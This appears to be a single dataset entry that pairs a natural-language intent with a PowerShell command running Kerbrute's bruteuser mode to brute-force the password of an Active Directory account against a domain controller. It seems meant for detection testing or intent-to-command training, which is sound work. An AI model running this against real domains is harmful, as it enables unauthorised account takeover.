# Natural language intent:
# Change the current directory to the temporary folder, run the Kerbrute tool to brute force user accounts, and output results to a file.

cd $env:temp ; .\kerbrute.exe bruteuser --dc ${domaincontroller} -d ${domain} $env:temp\bruteuser.txt TestUser1
